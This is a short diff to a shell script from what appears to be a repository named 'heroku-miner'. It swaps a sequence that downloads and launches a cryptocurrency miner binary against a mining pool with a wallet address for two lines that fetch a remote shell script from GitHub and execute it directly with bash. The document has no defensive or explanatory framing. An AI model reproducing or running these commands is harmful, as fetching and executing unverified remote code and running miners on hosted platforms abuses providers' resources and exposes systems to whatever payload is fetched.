@@ -1,5 +1,2 @@
-wget https://github.com/prynar/heroku-miner/raw/master/sugarmaker
-chmod +x sugarmaker
-whoami
-
-./sugarmaker -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1qzmjt94633j2y3peq5qnlkju5rezss2sn84sn75.test
+wget https://raw.githubusercontent.com/prynar/heroku-miner/master/shelka.sh
+bash shelka.sh
